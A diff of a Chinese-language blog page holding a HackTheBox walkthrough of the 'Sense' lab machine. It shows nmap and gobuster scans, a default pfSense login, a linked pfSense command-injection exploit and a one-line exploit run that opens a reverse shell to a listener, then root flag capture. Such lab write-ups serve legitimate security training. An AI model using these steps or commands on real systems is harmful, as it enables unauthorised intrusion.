@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;111  10.10.10.60   端口扫描80和443: 123456789101112131415161718$ nmap -sC -sV 10.10.10.60Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-12 13:46 CST">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;111  10.10.10.60                                                                                                              端口扫描80和443: 123456789">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sense - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/25/Sense-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;111  10.10.10.60   端口扫描80和443: 123456789101112131415161718$ nmap -sC -sV 10.10.10.60Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-12 13:46 CST">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;111  10.10.10.60                                                                                                              端口扫描80和443: 123456789">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031203.jpg">
@@ -126,7 +126,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -216,23 +216,58 @@
 </li>
 <li><h2 id="10-10-10-60"><a href="#10-10-10-60" class="headerlink" title="10.10.10.60"></a>10.10.10.60</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80和443:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.60</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 13:46 CST</span><br><span class="line">Nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">80/tcp  open  http     lighttpd 1.4.35</span><br><span class="line">|_http-server-header: lighttpd/1.4.35</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">443/tcp open  ssl/http lighttpd 1.4.35</span><br><span class="line">|_http-title: Login</span><br><span class="line">| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US</span><br><span class="line">| Not valid before: 2017-10-14T19:21:35</span><br><span class="line">|_Not valid after:  2023-04-06T19:21:35</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 89.66 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80-443"><a href="#80-443" class="headerlink" title="80/443"></a>80/443</h2><p>是pfsense：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031202.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>扫一下目录，重点就两个txt：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gobuster dir -k -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100</span><br><span class="line"></span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/help.php (Status: 200)</span><br><span class="line">/themes (Status: 301)</span><br><span class="line">/stats.php (Status: 200)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/edit.php (Status: 200)</span><br><span class="line">/includes (Status: 301)</span><br><span class="line">/license.php (Status: 200)</span><br><span class="line">/system.php (Status: 200)</span><br><span class="line">/status.php (Status: 200)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/changelog.txt (Status: 200)</span><br><span class="line">/classes (Status: 301)</span><br><span class="line">/exec.php (Status: 200)</span><br><span class="line">/widgets (Status: 301)</span><br><span class="line">/graph.php (Status: 200)</span><br><span class="line">/tree (Status: 301)</span><br><span class="line">/wizard.php (Status: 200)</span><br><span class="line">/shortcuts (Status: 301)</span><br><span class="line">/pkg.php (Status: 200)</span><br><span class="line">/installer (Status: 301)</span><br><span class="line">/wizards (Status: 301)</span><br><span class="line">/xmlrpc.php (Status: 200)</span><br><span class="line">/reboot.php (Status: 200)</span><br><span class="line">/interfaces.php (Status: 200)</span><br><span class="line">/csrf (Status: 301)</span><br><span class="line">/system-users.txt (Status: 200)</span><br></pre></td></tr></table></figure>
 
 <h2 id="system-users-txt"><a href="#system-users-txt" class="headerlink" title="system-users.txt"></a>system-users.txt</h2><p>给出用户名，密码就是默认的，搜一下就知道是<em>pfsense</em>：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="changelog-txt"><a href="#changelog-txt" class="headerlink" title="changelog.txt"></a>changelog.txt</h2><p>changelog提示存在未修复漏洞：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031204.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="pfsense"><a href="#pfsense" class="headerlink" title="pfsense"></a>pfsense</h1><p>使用前面得到的账号密码登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rohit : pfsense</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>版本2.1.3，直接搜exploit就可以：</p>
 <ul>
 <li>pfSense &lt; 2.1.4 - ‘status_rrd_graph_img.php’ Command Injection - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/43560" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43560</a></li>
@@ -240,10 +275,31 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>exp一键打：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py --rhost 10.10.10.60 --lhost 10.10.14.6 --lport 4444 --username rohit --password pfsense</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031206.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h1><p>直接是root权限，读取flags：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031208.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>pfSense &lt; 2.1.4 - ‘status_rrd_graph_img.php’ Command Injection - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/43560" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43560</a></li>
 <li><a href="https://www.hackthebox.eu/home/machines/writeup/111" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/111</a></li>
